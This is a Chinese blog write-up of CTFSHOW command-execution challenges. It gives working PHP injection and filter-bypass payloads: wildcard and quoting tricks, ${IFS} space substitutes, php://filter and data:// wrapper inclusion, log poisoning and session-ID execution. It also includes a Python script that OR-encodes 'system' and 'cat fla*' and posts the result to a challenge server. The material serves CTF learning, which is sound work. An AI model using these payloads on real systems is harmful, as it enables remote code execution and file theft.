<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTFSHOW-命令执行 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>CTFSHOW-命令执行</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-09-20T16:00:00.000Z" id="date"> 2022-09-21</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-09-23T10:59:25.850Z" id="updated"> 2022-09-23</time></div></span></div></div><hr><div id="post-content"><ol>
<li><p>命令执行 需要严格的过滤</p>
<p>只过滤了flag</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912002308798.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912002308798.png" alt="image-20220912002308798" style="zoom:50%;"></p>
</li>
</ol>
<p>学到了一些关于preg_match函数的正则匹配小细节</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">模式中的\b标记一个单词边界，所以只有独立的单词会被匹配，如：<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)) ：   True<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the website scripting language of choice.&quot;</span>)) ：   False<br>        <br>小技巧：如果仅仅想要检查某个字符串是否包含另外一个字符串，不要使用 <span class="hljs-title function_ invoke__">preg_match</span>() ， 使用 <span class="hljs-title function_ invoke__">strpos</span>() 会更快。 <br></code></pre></td></tr></table></figure>
<p>​    linux命令知识点：</p>
<ol>
<li><code>对于linux cat和ca&#39;&#39;t ca\t ca&quot;&quot;t效果是相同的 这样同样可以绕过字符的限制</code></li>
</ol>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912002817580.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912002817580.png" alt="image-20220912002817580" style="zoom:50%;"></p>
<ol>
<li><p><code>nl</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">The nl utility reads lines from the named file or the standard input if the<br>file argument is omitted, applies a configurable line numbering filter<br>operation and writes the result to the standard output.<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912003154074.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220912003154074.png" alt="image-20220912003154074" style="zoom:50%;"></p>
</li>
</ol>
<p>其实大体上是可以分为两个思路：</p>
<ol>
<li>针对c的输入参数命令进行绕过限制</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload1:c=system(&quot;nl fla?????&quot;);<br>payload2:c=system(&quot;nl fla*&quot;);<br>payload3:c=echo `nl fl&#x27;&#x27;ag.php`;或者c=echo `nl fl&quot;&quot;ag.php`;<br>payload4:c=echo `nl fl\ag.php`;//转义字符绕过<br></code></pre></td></tr></table></figure>
<ol>
<li>针对c，通过构建另外一个传参点来绕过对c的直接匹配</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>payload6:c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);<br></code></pre></td></tr></table></figure>
<ol>
<li><p>awk命令 主要是用来格式化文本内容的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">awk [参数] [处理内容] [操作对象]<br>预定义变量<br>$0	: 代表当前行(相当于匹配所有)<br></code></pre></td></tr></table></figure>
<p>统计每行的字段数（NF）</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913000908773.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913000908773.png" alt="image-20220913000908773" style="zoom:50%;"></p>
<p>取出值（$NF）</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913001059423.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913001059423.png" alt="image-20220913001059423" style="zoom:50%;"></p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>过滤了flag system和php</p>
<p>上一题继续打payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo `nl fl&#x27;&#x27;ag.ph&#x27;&#x27;p`<br></code></pre></td></tr></table></figure>
<p>或者针对system的过滤</p>
<p>有一些其他命令执行函数可以学习使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。<br>exec ： 执行一个外部程序,回显最后一行,需要用echo输出。<br>shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。<br>proc_open ： 执行一个命令，并且打开用来输入/输出的文件指针。<br>passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。<br>pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。 <br>`（反引号）：同 shell_exec() <br></code></pre></td></tr></table></figure>
<p>测试一下上面可以回显的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system passthru echo配合<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>过滤了cat sort shell . 空格 单引号</p>
<p>针对单引号，我们可以换成双引号</p>
<p><strong>针对空格</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;IFS&#125; 但不能写作 $IFS<br>$IFS$9<br>%09<br>&lt;&gt;<br>&lt;<br>$IFS%09<br><br>另外同cat功能的函数还有：<br>more:一页一页的显示档案内容<br>less:与 more 类似 head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看 <br>file -f:报错出具体内容<br>strings: find the printable strings in a object, or other binary, file<br></code></pre></td></tr></table></figure>
<p>一些payload学习</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">预期解<br>passthru(&quot;tac%09f*&quot;);<br>非预期<br>c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fla*&quot;);等价于system()<br>c=echo`strings%09f*`;<br>c=echo`strings\$IFS\$9f*`必须加转义字符<br><br>首先print_r(scandir(dirname(__FILE__)));查看当前目录下文件<br>然后找到flag.php<br>print_r(next(array_reverse(scandir(dirname(__FILE__)))));<br>之后高亮显示即可<br>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));<br>类似<br>c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多过滤了反引号 echo 分号和左括号</p>
<p>利用上面出现过的一个文件包含搭配php伪协议payload是可以绕过部分正则匹配的 </p>
<p>针对左括号，include函数可以不需要括号；针对分号，可以使用php短标签来闭合，起默认隐含了一个分号在其中</p>
<p>payload学习</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;nl fl*&quot;)?&gt;<br>c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多过滤了一个双引号，上面的payload继续打</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多过滤了一个冒号，继续</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多过滤了&lt;和=，继续</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>过滤了数字和/，继续（之前payload中的数字参数名得换一下）</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>题面换了</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913091815048.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913091815048.png" alt="image-20220913091815048" style="zoom:50%;"></p>
<p>一般见include都是想着php伪协议进行文件包含，由于过滤了flag所以如果要是用的话只能用data协议进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=data://text/plain,&lt;?php system(&quot;nl fl*&quot;);?&gt;<br></code></pre></td></tr></table></figure>
<p>另一个思路是通过日志文件包含，注入UA头进行命令执行，这道题的中间件为nginx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多过滤了php，file关键字，前面使用的data伪协议需要采用base64编码传输了</p>
<p>不知道咋回事，php短标签经过base64加密后就会失去隐含的分号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbCoiKTs/Pg==<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913101535901.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913101535901.png" alt="image-20220913101535901" style="zoom:50%;"></p>
<p>加了一个后缀限制，00截断？</p>
<p>并没有，版本都到php 7+了</p>
<p>因为前面data协议已经闭合了PHP执行语句，拼接起来就变成了<code>c=data://text/plain,&lt;?php system(&quot;nl fl*&quot;);?&gt;.php</code>，所以后缀并不会影响代码的执行</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913102047294.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913102047294.png" alt="image-20220913102047294"></p>
<p>好家伙，直接来个狠的。</p>
<p>题目来源于<code>GXYCTF的禁止套娃</code></p>
<p>注意的一个细节在于过滤的基本都是符号，并且括号是中文括号，英文括号依然可以使用，同时也没过滤分号。所以一些函数还是可以使用的，这道题考察的就是如何去拼接组合这些函数来构建一个命令执行语句</p>
<p>一些可以使用的备选函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">getallheaders()：返回所有的HTTP头信息，返回的是数组而eval要求为字符串，所以要用implode()函数将数组转换为字符串<br><br>get_defined_vars()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用var_dump()输出可以看见输出的内容，看见在第几位之后，可以用current()函数来获取其值，详细可以看官方函数。<br>payload：var_dump(current(get_defined_vars()));<br><br>session_id()：session_id()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。<br>    如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后用hex2bin()函数，<br>    即传入?exp=eval(hex2bin(session_id(session_start())));     <br>    并设置cookie：PHPSESSID=706870696e666f28293b<br>    session_start 函数是为了开启session<br>    <br>配合使用的函数：<br>	print_r(scandir(‘.’)); 查看当前目录下的所有文件名<br>  var_dump()<br>	localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>	current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名<br>	each() 返回数组中当前的键/值对并将数组指针向前移动一步<br>	end() 将数组的内部指针指向最后一个单元<br>	next() 将数组中的内部指针向前移动一位<br>	prev() 将数组中的内部指针倒回一位<br>	array_reverse() 以相反的元素顺序返回数组<br></code></pre></td></tr></table></figure>
<p>思路一：</p>
<ul>
<li><p>先扫描当前目录所有文件</p>
<p>原始<strong>payload</strong>：<code>var_dump(scandir(&#39;.&#39;))</code></p>
<p>由于点号被过滤，我们可以利用localeconv()返回数组中的点号元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=var_dump(scandir(current(localeconv())))<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913121936212.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913121936212.png" alt="image-20220913121936212"></p>
<p>可以看到flag.php位于倒数第二个元素，接下来就是用到数组操纵元素来定位到flag.php。通过<code>highlight_file</code>或<code>show_source</code>（两者一样）来显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=show_source(next(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>
</li>
</ul>
<p>思路二：</p>
<ul>
<li><p>通过cookie中的seesionid值来进行命令执行，首先需要开启session。其次可控输入session。最后获取sessionid进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=session_start();system(session_id());<br>PHPSESSID=ls<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913122957809.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913122957809.png" alt="image-20220913122957809" style="zoom:50%;"></p>
<p>不过PHPSESSID的值符号组成有限制</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913123031662.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220913123031662.png" alt="image-20220913123031662"></p>
</li>
</ul>
</li>
<li><p>过滤不严，命令执行</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914152635603.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914152635603.png" alt="image-20220914152635603"></p>
</li>
</ol>
<p>这里关键是过滤了所有的数字和字母（但是这里的数字指的是ascii码48-57的）,所以url编码的那种是可以通过过滤的，也就是没法使用正常的函数了。并且也不能用异或、取反、自增操作</p>
<p>这题主要利用到的是<code>|</code>或运算符以及括号，我们可以利用穷举脚本，来通过或运算获得我们想要的字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://829e7146-c785-4947-933d-53f8953b6f17.challenge.ctf.show/&quot;</span><br>useful = []<br><span class="hljs-comment"># 先筛一遍所有可用字符  </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    ch = <span class="hljs-built_in">chr</span>(i)<br>    <span class="hljs-built_in">bool</span> = re.match(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span>, ch, re.I)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        useful.append(i)<br>left = <span class="hljs-string">&quot;&quot;</span><br>right = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_k</span>(<span class="hljs-params">ch</span>):<br>    <span class="hljs-keyword">global</span> left<br>    <span class="hljs-keyword">global</span> right<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> useful:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> useful:<br>            <span class="hljs-keyword">if</span>((i | j) == <span class="hljs-built_in">ord</span>(ch)):<br>                left += <span class="hljs-built_in">chr</span>(i)<br>                right += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-keyword">return</span><br><span class="hljs-comment"># 构造命令执行语句</span><br>arg1 = <span class="hljs-string">&quot;system&quot;</span><br>arg2 = <span class="hljs-string">&quot;cat fla*&quot;</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> arg1:<br>    find_k(ch)<br>data1 = <span class="hljs-string">&quot;(\&quot;&quot;</span> + left + <span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span> + right + <span class="hljs-string">&quot;\&quot;)&quot;</span><br><br>left = <span class="hljs-string">&quot;&quot;</span><br>right = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> arg2:<br>    find_k(ch)<br>data2 = <span class="hljs-string">&quot;(\&quot;&quot;</span> + left + <span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span> + right + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;c&quot;</span>: data1 + data2<br>&#125;<br><span class="hljs-built_in">print</span>(data)<br><br>r = requests.post(url, data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
<ol>
<li><p>命令执行，需要严格的过滤</p>
<p>题面如图</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914193400810.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914193400810.png" alt="image-20220914193400810" style="zoom:50%;"></p>
<p>有个拼接操作，<code>/dev/null</code>是什么？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在类Unix系统中,/dev/null,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)<br>0   标准输入<br>1   标准输出<br>2   错误输出<br></code></pre></td></tr></table></figure>
<p>那么<code>&gt; &amp; 1 2</code>这些组合起来又是啥？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2&gt;/dev/null   把错误输出到空设备（即丢弃）<br>&gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备<br>2&gt;&amp;1 &gt;/dev/null   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃<br><br>something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.<br></code></pre></td></tr></table></figure>
<p>这里主要考查的是管道分割符一类的运用。我们的需求就是由于输出会被丢弃无法回显，所以我们不能让后面这些语句执行</p>
